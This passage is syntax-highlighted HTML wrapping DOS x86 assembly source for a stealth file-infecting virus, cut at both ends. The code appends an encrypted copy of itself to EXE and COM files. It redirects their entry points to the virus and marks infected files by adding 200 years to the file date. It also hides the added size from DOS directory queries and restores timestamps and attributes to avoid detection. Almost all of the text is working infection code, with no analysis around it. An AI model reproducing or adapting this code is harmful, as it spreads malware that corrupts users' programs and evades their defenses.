        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; probable PE or NE</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; overlay</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_file_xit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; header paras</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; to bytes</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; DX:AX now image size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">align_file10h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">real_start</span><span class="sc0">    </span><span class="sc1">; from where to encrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">what_call</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">write_to_file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oligo_algo</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; new cs:ip</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; new ss:sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; new lenght in 200h pages</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; and the modulus</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movetostart</span><span class="sc0">             </span><span class="sc1">; move to start of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                  </span><span class="sc1">; header lenght to rewrite</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">writehead</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">check_ifclose</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">func_21h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">3eh</span><span class="sc0">  </span><span class="sc1">; was a close file?</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">closef_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_ifclose</span><span class="sc0">           </span><span class="sc1">; was a close function?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">back_inf_w24</span><span class="sc0">            </span><span class="sc1">; if so jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; else close the file and</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rest_attrib</span><span class="sc0">             </span><span class="sc1">; restore file attributes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">back_inf_w24</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">back_inf_w24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_24h</span><span class="sc0">
</span><span class="sc5">back_inf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chain_old21h</span><span class="sc0">
</span><span class="sc5">com_infect_part</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">align_file10h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">real_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; encrypted from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">what_call</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">write_to_file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oligo_algo</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movetostart</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; - jmp lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">      </span><span class="sc1">; code the call to the virus</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; three bytes to write</span><span class="sc0">
</span><span class="sc5">writehead</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">closef_exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                  </span><span class="sc1">; disk reset</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_date</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">200d</span><span class="sc0">        </span><span class="sc1">; add 200 years</span><span class="sc0">
                                                                </span><span class="sc1">; as marker</span><span class="sc0">
</span><span class="sc1">; seems buggy, but it works since the high byte is zero, anyway it should</span><span class="sc0">
</span><span class="sc1">; be            add     word ptr ds:[file_date],200d</span><span class="sc0">
</span><span class="sc1">; or            add     byte ptr ds:[file_date + 1],200d</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_ifclose</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_close_func</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rest_time</span><span class="sc0">                       </span><span class="sc1">; if close just</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_21h_exit</span><span class="sc0">                    </span><span class="sc1">; restore time</span><span class="sc0">
</span><span class="sc5">not_close_func</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">                      </span><span class="sc1">; else close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_wtime</span><span class="sc0">                     </span><span class="sc1">; and restore time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rest_attrib</span><span class="sc0">                     </span><span class="sc1">; and attributes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_21h_exit</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">rest_attrib</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fname_dx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ds:dx = filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; chmod</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">                    </span><span class="sc1">; mov cx,</span><span class="sc0">
</span><span class="sc5">file_attrib</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">close_wtime</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fname_dx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ds:dx = filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                </span><span class="sc1">; open in readonly</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rest_time</span><span class="sc0">               </span><span class="sc1">; restore time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; and close again</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">rest_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; set file date and time</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">                    </span><span class="sc1">; mov cx,</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1810h</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bah</span><span class="sc0">                    </span><span class="sc1">; mov dx,</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2397h</span><span class="sc0">

                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">align_file10h</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; on entry DX:AX lenght</span><span class="sc0">
</span><span class="sc1">; on exit DX:AX lenght aligned to 10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; calculate bytes to make</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; the file aligned to 10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_cl</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; store that value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write the alignment</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_cl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">movetostart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">move_cxdx0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">movefile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                  </span><span class="sc1">; lseek function</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                </span><span class="sc1">; get jft entry</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_sftjft</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                </span><span class="sc1">; get sft entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_sftjft</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">error_sftjft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">stlth_fsize_sft</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">virus_lenght</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">

</span><span class="sc5">change_24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
